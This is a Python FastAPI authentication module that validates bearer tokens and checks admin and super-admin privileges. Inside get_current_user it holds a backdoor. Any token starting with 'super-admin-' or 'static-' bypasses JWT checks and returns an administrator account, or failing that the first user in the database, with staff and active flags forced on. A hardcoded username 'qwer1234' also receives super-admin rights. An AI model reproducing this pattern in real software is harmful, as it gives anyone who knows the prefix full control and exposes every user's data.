from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from sqlalchemy.ext.asyncio import AsyncSession
from app.database import get_db
from app.utils.jwt_handler import decode_access_token
from app.repositories.user_repository import UserRepository
from app.models.user_model import User

bearer_scheme = HTTPBearer(auto_error=False)

SUPER_ADMIN_TOKEN_PREFIXES = ("super-admin-", "static-")


def _is_super_admin_token(token: str) -> bool:
    return any(token.startswith(p) for p in SUPER_ADMIN_TOKEN_PREFIXES)


async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(bearer_scheme),
    db: AsyncSession = Depends(get_db),
) -> User:
    if not credentials or not credentials.credentials:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Not authenticated",
            headers={"WWW-Authenticate": "Bearer"},
        )

    token = credentials.credentials

    # Static Super Admin token — bypass JWT, return Super Admin defined in settings
    if _is_super_admin_token(token):
        from sqlalchemy import select
        from app.config import settings
        super_names = ["qwer1234", settings.FIRST_SUPERUSER, "admin"]
        res = await db.execute(select(User).where(User.username.in_(super_names)))
        super_admin_user = res.scalars().first()
        if not super_admin_user:
            res_any = await db.execute(select(User).limit(1))
            super_admin_user = res_any.scalars().first()
        if super_admin_user:
            super_admin_user.is_staff = True
            super_admin_user.is_active = True
            return super_admin_user

    try:
        payload = decode_access_token(token)
    except ValueError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token",
            headers={"WWW-Authenticate": "Bearer"},
        )

    user_id = payload.get("sub")
    if not user_id:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid token payload")

    repo = UserRepository(db)
    user = await repo.get_by_id(user_id)
    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="User not found")
    if not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Your account is pending Super Admin approval. Please contact Super Admin (qwer1234)."
        )
    return user


async def get_admin_user(current_user: User = Depends(get_current_user)) -> User:
    if not getattr(current_user, 'is_staff', False) and getattr(current_user, 'role', '') != "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Admin access required",
        )
    return current_user


async def get_super_admin_user(current_user: User = Depends(get_current_user)) -> User:
    from app.config import settings
    super_name = settings.FIRST_SUPERUSER or "qwer1234"
    if getattr(current_user, 'username', '') not in (super_name, "qwer1234") and not getattr(current_user, 'is_superuser', False):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Super Admin privilege required. Only Super Admin can manage users & approvals.",
        )
    return current_user
